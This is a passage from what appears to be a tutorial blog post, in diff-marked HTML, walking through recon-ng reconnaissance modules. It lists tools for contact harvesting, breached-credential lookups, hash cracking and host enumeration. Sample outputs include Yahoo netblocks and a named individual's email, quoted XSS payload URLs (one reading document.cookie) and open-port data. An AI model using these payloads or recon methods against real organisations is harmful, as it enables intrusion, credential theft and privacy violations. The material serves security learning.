-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][whois_miner] &gt; run
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/orgs;name=yahoo
-</span><span class='line'>
-</span><span class='line'>-----
-</span><span class='line'>YAHOO
-</span><span class='line'>-----
-</span><span class='line'>[*] Location: 701 First Avenue, Sunnyvale, CA 94089
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-1/nets
-</span><span class='line'>[*] Netblock: 8.3.34.0/23
-</span><span class='line'>[*] Netblock: 216.34.77.0/25
-</span><span class='line'>[*] Netblock: 8.8.178.0/24
-</span><span class='line'>[*] Netblock: 64.209.232.0/24
-</span><span class='line'>[*] Netblock: 64.39.38.208/28
-</span><span class='line'>[*] Netblock: 204.71.177.0/24
-</span><span class='line'>[*] Netblock: 204.71.188.0/24
-</span><span class='line'>[*] Netblock: 216.136.220.128/25
-</span><span class='line'>[*] Netblock: 64.56.197.208/28
-</span><span class='line'>[*] Netblock: 67.72.118.0/23
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-1/pocs
-</span><span class='line'>[*] Contact: Netblock Admin (netblockadmin@yahoo-inc.com) - Whois contact (Admin) (Sunnyvale, CA - United States)
-</span><span class='line'>[*] Contact: Netblock Admin (netblockadmin@yahoo-inc.com) - Whois contact (Tech) (Sunnyvale, CA - United States)
-</span><span class='line'>[*] Contact: Network Abuse (abuse@yahoo-inc.com) - Whois contact (Abuse) (Sunnyvale, CA - United States)
-</span><span class='line'>
-</span><span class='line'>-----
-</span><span class='line'>YAHOO
-</span><span class='line'>-----
-</span><span class='line'>[*] Location: 325 Geri St, Lawrenceburg, TN 38464
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-10/nets
-</span><span class='line'>[*] Netblock: 12.23.247.176/29
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/org/YAHOO-10/pocs
-</span><span class='line'>[*] Contact: Janice Kilburn (jkilburn1stop@yahoo.com) - Whois contact (Admin) (Lawrenceburg, TN - United States)
-</span><span class='line'>[*] Contact: Janice Kilburn (jkilburn1stop@yahoo.com) - Whois contact (Abuse) (Lawrenceburg, TN - United States)
-</span><span class='line'>[*] Contact: Janice Kilburn (jkilburn1stop@yahoo.com) - Whois contact (Tech) (Lawrenceburg, TN - United States)
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/customers;name=yahoo
-</span><span class='line'>
-</span><span class='line'>-----
-</span><span class='line'>YAHOO
-</span><span class='line'>-----
-</span><span class='line'>[*] Location: 225 Broadway, San Diego, CA 92101
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146168/nets
-</span><span class='line'>[*] Netblock: 209.132.98.0/29
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146168/pocs
-</span><span class='line'>[*] No POCS found.
-</span><span class='line'>
-</span><span class='line'>-----
-</span><span class='line'>YAHOO
-</span><span class='line'>-----
-</span><span class='line'>[*] Location: 225 Broadway, San Diego, CA 92101
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146169/nets
-</span><span class='line'>[*] Netblock: 209.132.98.8/29
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C00146169/pocs
-</span><span class='line'>[*] No POCS found.
-</span><span class='line'>
-</span><span class='line'>-----
-</span><span class='line'>YAHOO
-</span><span class='line'>-----
-</span><span class='line'>[*] Location: 624 S Grand, Los Angeles, CA 90017
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C01196389/nets
-</span><span class='line'>[*] Netblock: 65.91.7.80/29
-</span><span class='line'>[*] URL: http://whois.arin.net/rest/customer/C01196389/pocs
-</span><span class='line'>[*] No POCS found.
-</span><span class='line'>
-</span><span class='line'>-------
-</span><span class='line'>SUMMARY
-</span><span class='line'>-------
-</span><span class='line'>[*] 5 total (2 new) companies found.
-</span><span class='line'>[*] 5 total (4 new) locations found.
-</span><span class='line'>[*] 14 total (14 new) netblocks found.
-</span><span class='line'>[*] 6 total (6 new) contacts found.</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><p>Bing Linkedin Profile Harvester &ndash; Harvests contacts from linkedin.com by querying Bing for Linkedin pages related to the given
-companies, parsing the profiles, and adding them to the &lsquo;profiles&rsquo; table</p></li>
-<li><p>MailTester Email Validator &ndash; Leverages MailTester.com to validate email addresses</p></li>
-<li><p>Contact Name Mangler &ndash; Applies a mangle pattern to all of the contacts stored in the database, creating email addresses or
-usernames for each harvested contact. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
-<li><p>Contact Name Unmangler &ndash; Applies a regex or unmangle pattern to all of the contacts stored in the database, pulling out the
-individual name components. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
-<li><p>Have I been pwned? Breach Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses are associated with breached
-credentials. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
-<li><p>Have I been pwned? Paste Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses have been published to various
-paste sites. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
-<li><p>PwnedList Validator &ndash; Leverages PwnedList.com to determine if email addresses are associated with leaked credentials. Adds
-compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
-<li><p>Contacts to Domains Data Migrator &ndash; Adds a new domain for all the hostnames associated with email addresses stored in the &lsquo;contacts&rsquo;
-table.</p></li>
-<li><p>FullContact Contact Enumerator &ndash; Harvests contact information and profiles from the fullcontact.com API using email addresses as
-input. Updates the &lsquo;contacts&rsquo; and &lsquo;profiles&rsquo; tables with the results.</p></li>
-<li><p>Adobe Hash Cracker &ndash; Decrypts hashes leaked from the 2013 Adobe breach. First, the module cross references the leak ID to
-identify Adobe hashes in the &lsquo;password&rsquo; column of the &lsquo;creds&rsquo; table, moves the Adobe hashes to the
-&lsquo;hash&rsquo; column, and changes the &lsquo;type&rsquo; to &lsquo;Adobe&rsquo;. Second, the module attempts to crack the hashes
-by comparing the ciphertext&rsquo;s decoded cipher blocks to a local block lookup table (BLOCK_DB) of
-known cipher block values. Finally, the module updates the &lsquo;creds&rsquo; table with the results based on
-the level of success.</p></li>
-<li><p>PyBozoCrack Hash Lookup &ndash; Searches Google for the value of a hash and tests for a match by hashing every word in the resulting
-page using all hashing algorithms supported by the &lsquo;hashlib&rsquo; library. Updates the &lsquo;credentials&rsquo;
-table with the positive results.</p></li>
-<li><p>Hashes.org Hash Lookup &ndash; Uses the Hashes.org API to perform a reverse hash lookup. Updates the &lsquo;credentials&rsquo; table with the
-positive results.</p></li>
-<li><p>leakdb Hash Lookup &ndash; Uses the leakdb hash database to perform a reverse hash lookup. Updates the &lsquo;credentials&rsquo; table with
-the positive results.</p></li>
-<li><p>PGP Key Owner Lookup &ndash; Searches the MIT public PGP key server for email addresses of the given domain. Updates the
-&lsquo;contacts&rsquo; table with the results</p></li>
-</ul>
-
-
-<p>This module is similar to <a href="recon/domains-contacts/salesmaple">theHarvester</a></p>
-
-<ul>
-<li><p>SalesMaple Contact Harvester &ndash; Harvests contacts from the SalesMaple API using domains as input. Updates the &lsquo;contacts&rsquo; table with
-the results.</p></li>
-<li><p>Whois POC Harvester &ndash; Uses the ARIN Whois RWS to harvest POC data from whois queries for the given domain. Updates the
-&lsquo;contacts&rsquo; table with the results.</p></li>
-<li><p>PwnedList &ndash; Account Credentials Fetcher &ndash; Queries the PwnedList API for credentials associated with the given usernames. Updates the
-&lsquo;credentials&rsquo; table with the results.</p></li>
-<li><p>PwnedList &ndash; API Usage Statistics Fetcher &ndash; Queries the PwnedList API for account usage statistics</p></li>
-<li><p>PwnedList &ndash; Pwned Domain Credentials Fetcher &ndash; Queries the PwnedList API to fetch all credentials for a domain. Updates the &lsquo;credentials&rsquo; table
-with the results</p></li>
-<li><p>PwnedList &ndash; Pwned Domain Statistics Fetcher &ndash; Queries the PwnedList API for a domain to determine if any associated credentials have been
-compromised. This module does NOT return any credentials, only a total number of compromised
-credentials.</p></li>
-<li><p>PwnedList &ndash; Leak Details Fetcher (leak_lookup.py) &ndash; Queries the local database for information associated with a leak ID. The &lsquo;leaks_dump&rsquo; module must
-be used to populate the local database before this module will execute successfully.</p></li>
-<li><p>PwnedList &ndash; Leak Details Fetcher (leaks_dump.py) &ndash; Queries the PwnedList API for information associated with all known leaks. Updates the &lsquo;leaks&rsquo; table with the results.</p></li>
-<li><p>DNS Public Suffix Brute Forcer &ndash; Brute forces TLDs and SLDs using DNS. Updates the &lsquo;domains&rsquo; table with the results</p></li>
-<li><p>Baidu Hostname Enumerator &ndash; Harvests hosts from Baidu.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
-the results</p></li>
-<li><p>Bing API Hostname Enumerator &ndash; Leverages the Bing API and &ldquo;domain:&rdquo; advanced search operator to harvest hosts. Updates the &lsquo;hosts&rsquo;
-table with the results.</p></li>
-<li><p>Bing Hostname Enumerator &ndash; Harvests hosts from Bing.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with the
-results.</p></li>
-<li><p>DNS Hostname Brute Forcer &ndash; Brute forces host names using DNS. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
-<li><p>BuiltWith Enumerator &ndash; Leverages the BuiltWith API to identify hosts, technologies, and contacts associated with a domain</p></li>
-<li><p>Google CSE Hostname Enumerator &ndash; Leverages the Google Custom Search Engine API to harvest hosts using the &lsquo;site&rsquo; search operator.
-Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
-<li><p>Google Hostname Enumerator &ndash; Harvests hosts from Google.com by using the &lsquo;site&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
-the results</p></li>
-<li><p>Netcraft Hostname Enumerator &ndash; Harvests hosts from Netcraft.com. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
-<li><p>Shodan Hostname Enumerator &ndash; Harvests hosts from the Shodan API by using the &lsquo;hostname&rsquo; search operator. Updates the &lsquo;hosts&rsquo;
-table with the results.</p></li>
-<li><p>SSL SAN Lookup &ndash; Uses the ssltools.com site to obtain the Subject Alternative Names for a domain. Updates the &lsquo;hosts&rsquo;
-table with the results.</p></li>
-<li><p>VPNHunter Lookup &ndash; Checks vpnhunter.com for SSL VPNs, remote accesses, email portals and generic login sites. Updates
-the &lsquo;hosts&rsquo; table with the results.</p></li>
-<li><p>Yahoo Hostname Enumerator &ndash; Harvests hosts from Yahoo.com by using the &lsquo;domain&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table with
-the results.</p></li>
-<li><p>PunkSPIDER Vulnerabilty Finder &ndash; Leverages the PunkSPIDER API to search for previosuly discovered vulnerabltiies on hosts within a
-domain.</p></li>
-<li><p>XSSed Domain Lookup &ndash; Checks XSSed.com for XSS records associated with a domain and displays the first 20 results</p></li>
-</ul>
-
-
-<p>This is a very handy module for XSS lookup. Let&rsquo;s take a look at it:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][xssed] &gt; run
-</span><span class='line'>
-</span><span class='line'>---------
-</span><span class='line'>YAHOO.COM
-</span><span class='line'>---------
-</span><span class='line'>[*] Category: XSS
-</span><span class='line'>[*] Example: http://adz.kr.yahoo.com/CRZY/2006/hyundaicard_0913_150365_1a.swf?clickTAG=javascript:alert%20(docume&lt;br&gt;nt.cookie);document.location%20=%20%22http://1337hax0rz.com%22
-</span><span class='line'>[*] Host: adz.kr.yahoo.com
-</span><span class='line'>[*] Publish_Date: 2015-03-10 00:00:00
-</span><span class='line'>[*] Reference: http://xssed.com/mirror/60821/
-</span><span class='line'>[*] Status: fixed
-</span><span class='line'>--------------------------------------------------
-</span><span class='line'>[*] Category: XSS
-</span><span class='line'>[*] Example: http://us.yimg.vip.scd.yahoo.com/us.yimg.com/a/ya/yahoo_mail/ninja8b_nooffer.swf?clickTAG=javascript&lt;br&gt;:alert(/412/)
-</span><span class='line'>[*] Host: us.yimg.vip.scd.yahoo.com
-</span><span class='line'>[*] Publish_Date: 2012-02-16 00:00:00
-</span><span class='line'>[*] Reference: http://xssed.com/mirror/57596/
-</span><span class='line'>[*] Status: fixed
-</span><span class='line'>--------------------------------------------------
-</span><span class='line'>[*] Category: Script Insertion
-</span><span class='line'>[*] Example: http://fr.groups.yahoo.com/search?query=%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83))%3C%2Fsc&lt;br&gt;ript%3E&sort=relevance
-</span><span class='line'>[*] Host: fr.groups.yahoo.com
-</span><span class='line'>[*] Publish_Date: 2011-12-22 00:00:00
-</span><span class='line'>[*] Reference: http://xssed.com/mirror/61982/
-</span><span class='line'>[*] Status: unfixed
-</span><span class='line'>--------------------------------------------------
-</span><span class='line'>[*] Category: XSS
-</span><span class='line'>[*] Example: http://basketball.fantasysports.yahoo.com/nba/playerranker?lid=&lt;script&gt;alert(/XSS-by-[]0iZy5/)&lt;/scri&lt;br&gt;pt&gt;
-</span><span class='line'>[*] Host: basketball.fantasysports.yahoo.com
-</span><span class='line'>[*] Publish_Date: 2011-12-21 00:00:00
-</span><span class='line'>[*] Reference: http://xssed.com/mirror/71051/
-</span><span class='line'>[*] Status: unfixed
-</span><span class='line'>--------------------------------------------------
-</span><span class='line'>[*] Category: Redirect
-</span><span class='line'>[*] Example: http://www.yahoo.com/SIG=15ohh3h62/M=722732.13975606.14062129.13194555/D=regst/S=150002347:R2/Y=YAHO&lt;br&gt;O/EXP=1275539597/L=hnNys0Kjqbp5Cok8Sr10cAJDTPYa3UwHFG0AANhn/B=VSDoPmKJiUs-/J=1275532397077354/K=rS6p&lt;br&gt;wy3MN2NPP7SBqBCOAQ/A=6097785/R=0/SIG=11o4aqdmv/*http://xssed.com/newsearch/searchpad.html
-</span><span class='line'>[*] Host: www.yahoo.com
-</span><span class='line'>[*] Publish_Date: 2011-12-21 00:00:00
-</span><span class='line'>[*] Reference: http://xssed.com/mirror/67076/
-</span><span class='line'>[*] Status: unfixed
-</span><span class='line'>--------------------------------------------------
-</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>XSSposed Domain Lookup &ndash; Checks XSSposed.com for XSS records associated with a domain</li>
-</ul>
-
-
-<p>Another good module for hunting down XSS</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][xssposed] &gt; run
-</span><span class='line'>
-</span><span class='line'>---------------
-</span><span class='line'>BITDEFENDER.COM
-</span><span class='line'>---------------
-</span><span class='line'>[*] Category: REDIRECT
-</span><span class='line'>[*] Example: https://safeweb.norton.com/report/show?url=store.bitdefender.com
-</span><span class='line'>[*] Host: store.bitdefender.com
-</span><span class='line'>[*] Publish_Date: 2016-06-20 21:09:16
-</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/160213/
-</span><span class='line'>[*] Status: unfixed
-</span><span class='line'>--------------------------------------------------
-</span><span class='line'>[*] Category: XSS
-</span><span class='line'>[*] Example: https://labs.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert`OPENBUGBOUNTY`
-</span><span class='line'>[*] Host: labs.bitdefender.com
-</span><span class='line'>[*] Publish_Date: 2016-05-17 20:31:25
-</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/154457/
-</span><span class='line'>[*] Status: fixed
-</span><span class='line'>--------------------------------------------------
-</span><span class='line'>[*] Category: XSS
-</span><span class='line'>[*] Example: https://rdprojects.bitdefender.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert`OPENBUGBOUNTY`
-</span><span class='line'>[*] Host: rdprojects.bitdefender.com
-</span><span class='line'>[*] Publish_Date: 2016-05-17 20:32:26
-</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/154458/
-</span><span class='line'>[*] Status: fixed
-</span><span class='line'>--------------------------------------------------
-</span><span class='line'>[*] Category: REDIRECT
-</span><span class='line'>[*] Example: http://www.bitdefender.com/site/Main/tdRedirect/?url=http://xssposed.org/
-</span><span class='line'>[*] Host: bitdefender.com
-</span><span class='line'>[*] Publish_Date: 2016-01-03 01:53:37
-</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/121291/
-</span><span class='line'>[*] Status: fixed
-</span><span class='line'>--------------------------------------------------
-</span><span class='line'>[*] Category: REDIRECT
-</span><span class='line'>[*] Example: https://store.bitdefender.com/redirect.php?url=http://xssposed.org/
-</span><span class='line'>[*] Host: store.bitdefender.com
-</span><span class='line'>[*] Publish_Date: 2015-09-19 20:33:58
-</span><span class='line'>[*] Reference: https://www.openbugbounty.org/incidents/87399/
-</span><span class='line'>[*] Status: fixed
-</span><span class='line'>--------------------------------------------------
-</span><span class='line'>
-</span><span class='line'>-------
-</span><span class='line'>SUMMARY
-</span><span class='line'>-------
-</span><span class='line'>[*] 5 total (5 new) vulnerabilities found.</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><p>Hosts to Domains Data Migrator &ndash; Adds a new domain for all the hostnames stored in the &lsquo;hosts&rsquo; table</p></li>
-<li><p>Bing API IP Neighbor Enumerator &ndash; Leverages the Bing API and &ldquo;ip:&rdquo; advanced search operator to enumerate other virtual hosts sharing
-the same IP address. Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
-<li><p>FreeGeoIP &ndash; Leverages the freegeoip.net API to geolocate a host by IP address. Updates the &lsquo;hosts&rsquo; table with
-the results</p></li>
-</ul>
-
-
-<p>I used this to check the location of www.google.com host (resolved the IP first):</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][freegeoip] &gt; run
-</span><span class='line'>[*] 172.217.16.100 - 37.4192,-122.0574 - Mountain View, California, United States</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><p>My-IP-Neighbors.com Lookup &ndash; Checks My-IP-Neighbors.com for virtual hosts on the same server. Updates the &lsquo;hosts&rsquo; table with the
-results.</p></li>
-<li><p>IPInfoDB GeoIP &ndash; Leverages the ipinfodb.com API to geolocate a host by IP address. Updates the &lsquo;hosts&rsquo; table with the
-results.</p></li>
-<li><p>Hostname Resolver &ndash; Resolves the IP address for a host. Updates the &lsquo;hosts&rsquo; table with the results</p></li>
-<li><p>Reverse Resolver &ndash; Conducts a reverse lookup for each IP address to resolve the hostname. Updates the &lsquo;hosts&rsquo; table
-with the results.</p></li>
-<li><p>Address Geocoder &ndash; Queries the Google Maps API to obtain coordinates for an address. Updates the &lsquo;locations&rsquo; table with
-the results.</p></li>
-</ul>
-
-
-<p>Let&rsquo;s see this module in action with one of our favorite tech giants&#8217; addresses xD (I leave it to you to see what&rsquo;s located there):</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][geocode] &gt; run
-</span><span class='line'>[*] Geocoding '1600 Amphitheatre Parkway'...
-</span><span class='line'>[*] Latitude: 37.4224713, Longitude: -122.0843333
-</span><span class='line'>
-</span><span class='line'>-------
-</span><span class='line'>SUMMARY
-</span><span class='line'>-------
-</span><span class='line'>[*] 1 total (1 new) locations found.</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>Reverse Geocoder &ndash; Queries the Google Maps API to obtain an address from coordinates.</li>
-</ul>
-
-
-<p>So we have some coordinates. Let&rsquo;s see what&rsquo;s there:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][reverse_geocode] &gt; run
-</span><span class='line'>[*] Reverse geocoding (35.670337, 139.702573)...
-</span><span class='line'>[*] 1 Chome-18-20 Jingūmae, Shibuya-ku, Tōkyō-to 150-0001, Japan
-</span><span class='line'>
-</span><span class='line'>-------
-</span><span class='line'>SUMMARY
-</span><span class='line'>-------
-</span><span class='line'>[*] 1 total (1 new) locations found.</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><p>Flickr Geolocation Search &ndash; Searches Flickr for media in the specified proximity to a location.</p></li>
-<li><p>Instagram Geolocation Search &ndash; Searches Instagram for media in the specified proximity to a location.</p></li>
-<li><p>Picasa Geolocation Search &ndash; Searches Picasa for media in the specified proximity to a location.</p></li>
-<li><p>Shodan Geolocation Search &ndash; Searches Shodan for media in the specified proximity to a location.</p></li>
-<li><p>Twitter Geolocation Search &ndash; Searches Twitter for media in the specified proximity to a location.</p></li>
-<li><p>YouTube Geolocation Search &ndash; Searches YouTube for media in the specified proximity to a location.</p></li>
-<li><p>Whois Company Harvester &ndash; Uses the ARIN Whois RWS to harvest Companies data from whois queries for the given netblock. Updates
-the &lsquo;companies&rsquo; table with the results.</p></li>
-<li><p>Reverse Resolver &ndash; Conducts a reverse lookup for each of a netblock&rsquo;s IP addresses to resolve the hostname. Updates the
-&lsquo;hosts&rsquo; table with the results.</p></li>
-<li><p>Shodan Network Enumerator &ndash; Harvests hosts from the Shodan API by using the &lsquo;net&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table
-with the results.</p></li>
-<li><p>Internet Census 2012 Lookup &ndash; Queries the Internet Census 2012 data through Exfiltrated.com to enumerate open ports for a
-netblock.</p></li>
-</ul>
-
-
-<p>This will come in handy to give you an idea about hosts without directly port scanning them:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][census_2012] &gt; run
-</span><span class='line'>
-</span><span class='line'>-----------
-</span><span class='line'>8.3.34.0/23
-</span><span class='line'>-----------
-</span><span class='line'>[*] 8.3.34.0/23 (8.3.34.0 - 8.3.35.255)
-</span><span class='line'>[*] 8.3.34.5 (rsw4-1-gci.smpenn.corp.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.34.28 (UNKNOWN-8-3-34-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.34.46 (UNKNOWN-8-3-34-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.34.60 (UNKNOWN-8-3-34-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.34.66 (UNKNOWN-8-3-34-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.34.79 (UNKNOWN-8-3-34-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.34.222 (UNKNOWN-8-3-34-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.34.225 (UNKNOWN-8-3-34-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.34.231 (UNKNOWN-8-3-34-X.yahoo.com) - 25
-</span><span class='line'>[*] 8.3.34.231 (UNKNOWN-8-3-34-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.34.246 (tstsqlclstr1d.smca.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.34.255 (UNKNOWN-8-3-34-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.35.71 (UNKNOWN-8-3-35-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.35.182 (UNKNOWN-8-3-35-X.yahoo.com) - 25
-</span><span class='line'>[*] 8.3.35.182 (UNKNOWN-8-3-35-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.35.186 (UNKNOWN-8-3-35-X.yahoo.com) - 80
-</span><span class='line'>[*] 8.3.35.220 (UNKNOWN-8-3-35-X.yahoo.com) - 80
-</span><span class='line'>
-</span><span class='line'>-------
-</span><span class='line'>SUMMARY
-</span><span class='line'>-------
-</span><span class='line'>[*] 17 total (17 new) ports found.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>`</p>
-
-<ul>
-<li><p>Ports to Hosts Data Migrator &ndash; Adds a new host for all the hostnames stored in the &lsquo;ports&rsquo; table.</p></li>
-<li><p>Dev Diver Repository Activity Examiner &ndash; Searches public code repositories for information about a given username.</p></li>
-</ul>
-
-
-<p>This is another useful module to search for a developer on different platforms (note to self: I have to get back into coding frenzy):</p>
-
